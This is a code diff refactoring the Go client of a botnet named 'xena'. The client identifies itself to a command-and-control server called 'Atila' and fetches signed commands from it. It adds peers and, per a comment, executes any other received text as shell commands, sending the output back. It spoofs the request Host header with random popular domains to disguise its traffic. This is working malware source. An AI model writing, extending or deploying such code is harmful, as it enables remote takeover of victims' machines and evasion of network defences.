@@ -1,4 +1,4 @@
-package main
+package gateway
 
 import (
 	"bytes"
@@ -9,10 +9,12 @@ import (
 	"net/http"
 	"strconv"
 	"strings"
+	"xena/config"
+	"xena/domains"
 	"xena/helpers"
 	"xena/modules"
 	"xena/networking"
-	"xena/services"
+	"xena/repository"
 
 	"github.com/golang-jwt/jwt"
 )
@@ -20,17 +22,6 @@ import (
 // Content of reply message.
 type ParsedMessageContnet struct {
 	Shell string `json:"shell"` // Shell code.
-}
-
-// Message received from the server.
-type Message struct {
-	Id      string `json:"id"`      // Unique identifier.
-	From    string `json:"from"`    // Node which originally issued the message.
-	To      string `json:"to"`      // Which node should receive message.
-	Subject string `json:"subject"` // Key used for rounting of the content into different code paths.
-	Content string `json:"content"` // Base64 encoded data.
-	Status  string `json:"status"`  // Message's state.
-	ReplyTo string `json:"replyTo"` // Original message ID.
 }
 
 // Message going towards the server.
@@ -60,14 +51,8 @@ type IdentifyPayload struct {
 	Status    string `json:"status"`    // Bot's status.
 }
 
-// Payload for endpoint of Atila for message's ack.
-type MessageAck struct {
-	Id     string `json:"id"`
-	Status string `json:"status"`
-}
-
-// identify makes the bot known to the Atila server. Returns true if identification was successful.
-func identify(host, id string, publicKey *rsa.PublicKey) error {
+// Identify makes the bot known to the Atila server. Returns true if identification was successful.
+func Identify(host, id string, publicKey *rsa.PublicKey) error {
 	// Bot's identification details which will be stored in the Atila's database.
 	details := IdentifyPayload{
 		Id:        id,
@@ -113,9 +98,9 @@ func identify(host, id string, publicKey *rsa.PublicKey) error {
 	return nil
 }
 
-// messageAck changes a message's state. This will prevent the Atila from sending that message again.
-func messageAck(host, messageId string) error {
-	messageAck := MessageAck{
+// MessageAck changes a message's state. This will prevent the Atila from sending that message again.
+func MessageAck(host, messageId string) error {
+	messageAck := domains.MessageAck{
 		Id:     messageId,
 		Status: "SEEN",
 	}
@@ -142,7 +127,7 @@ func messageAck(host, messageId string) error {
 
 	response, err := client.Do(request)
 	if err != nil {
-		fmt.Println(err)
+		return err
 	}
 
 	defer response.Body.Close()
@@ -157,14 +142,14 @@ func messageAck(host, messageId string) error {
 	return nil
 }
 
-// sendMessage makes a POST request to Atila which saves the message reply.
-func sendMessage(host string, message Message) error {
-	insertionJson, err := json.Marshal(message)
+// SendMessage makes a POST request to Atila which saves the message reply.
+func SendMessage(host string, message domains.Message) error {
+	insertionJson, err := message.String()
 	if err != nil {
 		return err
 	}
 
-	payloadJson, err := networking.SerializedTraffic(string(insertionJson))
+	payloadJson, err := networking.SerializedTraffic(insertionJson)
 	if err != nil {
 		return err
 	}
@@ -192,9 +177,9 @@ func sendMessage(host string, message Message) error {
 	return nil
 }
 
-// interpretMessage given the message it will generate a reply message.
-func interpretMessage(host string, message Message) (Message, error) {
-	var reply Message = Message{
+// InterpretMessage given the message it will generate a reply message.
+func InterpretMessage(host string, message domains.Message) (domains.Message, error) {
+	var reply domains.Message = domains.Message{
 		From:    message.To,
 		ReplyTo: message.Id,
 	}
@@ -211,7 +196,7 @@ func interpretMessage(host string, message Message) (Message, error) {
 		if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok {
 			return nil, errors.New("invalid signing algorithm")
 		}
-		return trustedPublicKey, nil
+		return config.TrustedPublicKey, nil
 	})
 	if err != nil {
 		return reply, err
@@ -235,7 +220,7 @@ func interpretMessage(host string, message Message) (Message, error) {
 		// Add a bot peer.
 	} else if strings.HasPrefix(content.Shell, "/addPeer ") {
 		peerAddress := content.Shell[9:]
-		entitiesPool = append(entitiesPool, Entity{
+		repository.EntitiesPool = append(repository.EntitiesPool, domains.Entity{
 			Address: peerAddress,
 		})
 		replyContent.Other = "Added peer:" + peerAddress
@@ -260,12 +245,13 @@ func interpretMessage(host string, message Message) (Message, error) {
 
 		// Perform web search using duckduckgo.
 	} else if strings.HasPrefix(content.Shell, "/duckit ") {
-		term := content.Shell[8:]
-		searchResults, err := services.Duckit(term)
-		if err != nil {
-			return reply, err
-		}
-		replyContent.WebSearchResults = searchResults
+		// - - - TEMP DISABLED - - -
+		// term := content.Shell[8:]
+		// searchResults, err := services.Duckit(term)
+		// if err != nil {
+		// 	return reply, err
+		// }
+		replyContent.WebSearchResults = []string{} // searchResults
 
 		// If nothing maches then just execute it in the shell and return the result.
 	} else {
@@ -285,7 +271,7 @@ func interpretMessage(host string, message Message) (Message, error) {
 		"webHistorySearches": replyContent.WebHistorySearches,
 	})
 
-	replyTokenString, err := replyToken.SignedString(privateIdentificationKey)
+	replyTokenString, err := replyToken.SignedString(config.PrivateIdentificationKey)
 	if err != nil {
 		return reply, err
 	}
@@ -296,10 +282,10 @@ func interpretMessage(host string, message Message) (Message, error) {
 	return reply, nil
 }
 
-// fetchMessages reaches out to Atila (cnc) and gets the unseen messages.
+// FetchMessages reaches out to Atila (cnc) and gets the unseen messages.
 // Do remember to ack. the message after interpreting it and issue the response.
-func fetchMessages(host, id string) ([]Message, error) {
-	var messages []Message
+func FetchMessages(host, id string) ([]domains.Message, error) {
+	var messages []domains.Message
 
 	request, err := http.NewRequest("GET", host+helpers.RandEntry(atilaFetchMessagesMap)+"?status=SENT&clientId="+id, nil)
 	request.Host = helpers.RandomPopularDomain()
